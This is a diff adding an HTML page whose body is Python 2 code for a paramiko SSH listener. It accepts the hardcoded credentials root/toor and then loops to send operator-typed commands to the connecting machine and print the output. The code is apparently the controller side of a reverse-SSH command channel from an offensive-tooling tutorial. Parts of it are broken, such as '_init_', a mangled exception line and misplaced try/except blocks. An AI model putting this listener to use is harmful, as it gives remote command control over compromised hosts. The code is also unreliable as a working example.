@@ -1,0 +1,67 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Example Server</title>
+</head><body>import socket<br/>
+import paramiko<br/>
+import threading<br/>
+import sys<br/>
+<br/>
+host_key = paramiko.RSAKey(filename='/root/Desktop/test_rsa.key')<br/>
+<br/>
+class Server (paramiko.ServerInterface):<br/>
+ def _init_(self):<br/>
+   self.event = threading.Event()<br/>
+ def check_channel_request(self, kind, chanid):<br/>
+   if kind == 'session':<br/>
+     return paramiko.OPEN_SUCCEEDED<br/>
+   return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED<br/>
+ def check_auth_password(self, username, password):<br/>
+   if (username == 'root') and (password == 'toor'):<br/>
+     return paramiko.AUTH_SUCCESSFUL<br/>
+   return paramiko.AUTH_FAILED<br/>
+<br/>
+try:<br/>
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<br/>
+  sock.bind(('10.0.2.15', 22))<br/>
+  sock.listen(100)<br/>
+  print '[+] Listening for connection ...'<br/>
+  client, addr = sock.accept()<br/>
+except Exception, e:<br/>
+  print '[-] Listen/bind/accept failed: ' + str(e)<br/>
+  sys.exit(1)<br/>
+print '[+] Got a connection!'<br/>
+<br/>
+try:<br/>
+  t = paramiko.Transport(client)<br/>
+  try:<br/>
+    t.load_server_moduli()<br/>
+  except:<br/>
+    print '[-] (Failed to load moduli -- gex will be unsupported.)'<br/>
+    raise<br/>
+  t.add_server_key(host_key)<br/>
+  server = Server()<br/>
+  try:<br/>
+    t.start_server(server=server)<br/>
+  except paramiko.SSHException, x:<br/>
+    print '[-] SSH negotiation failed.'<br/>
+<br/>
+  chan = t.accept(20)<br/>
+  print '[+] Authenticated!'<br/>
+  print chan.recv(1024)<br/>
+  chan.send('Yeah i can see this')<br/>
+<br/>
+while True:<br/>
+  command= raw_input(&quot;Enter command: &quot;).strip('\n')<br/>
+  chan.send(command)<br/>
+  print chan.recv(1024) + '\n'<br/>
+<br/>
+except Exception, e:<br/>
+  print '[-] Caught exception: ' + str(e. class ) + ': ' + str(e)<br/>
+  try:<br/>
+    t.close()<br/>
+  except:<br/>
+    pass<br/>
+  sys.exit(1)<br/>
+</body></html>
